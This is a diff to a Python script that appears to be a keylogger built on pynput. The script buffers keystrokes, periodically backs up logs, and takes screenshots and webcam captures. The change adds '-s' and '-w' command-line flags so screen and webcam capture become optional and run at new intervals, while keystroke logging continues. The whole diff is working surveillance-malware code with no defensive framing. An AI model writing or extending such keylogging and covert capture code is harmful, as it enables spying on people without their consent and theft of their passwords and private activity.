@@ -1,3 +1,4 @@
+import sys
 from log import logger, screenshot
 from pynput import keyboard
 from pynput.keyboard import Key, Listener, KeyCode, Controller
@@ -14,6 +15,8 @@ is_ctrl_pressed:bool = False
 is_alt_pressed:bool = False
 is_shift_pressed:bool = False
 should_register:bool = True
+should_capture_screenshots:bool = False
+should_capture_webcam:bool = False
 is_idle:bool = True
 key_buffer:list[str] = list()
 buffer_capacity:int = 500
@@ -140,9 +143,11 @@ def __exit_immediately(*args):
 
 def __init_executors():
     logger.init()
-    Countdown.make_and_start("screenshots", 4 * 60, __take_screenshot)
-    Countdown.make_and_start("cam capture", 2.8, __make_cam_capture)
     Countdown.make_and_start("backup logs", 25 * 60, __check_for_new_characters)
+    if should_capture_screenshots:
+        Countdown.make_and_start("screenshots", 3 * 60, __take_screenshot)
+    if should_capture_webcam:
+        Countdown.make_and_start("cam capture", 17 * 60, __make_cam_capture)
 
 
 def __shutdown_executors():
@@ -150,8 +155,20 @@ def __shutdown_executors():
     Countdown.stop_all()
 
 
+def __read_program_args():
+    global should_capture_screenshots, should_capture_webcam
+    if len(sys.argv) > 1:
+        for arg in sys.argv:
+            if arg == '-s':
+                should_capture_screenshots = True
+            elif arg == '-w':
+                should_capture_webcam = True
+
+
+
 # ________________________________________ START _________________________________________________
 
+__read_program_args()
 __init_executors()
 
 with keyboard.Listener(on_press=on_pressed, on_release=on_release) as listener:
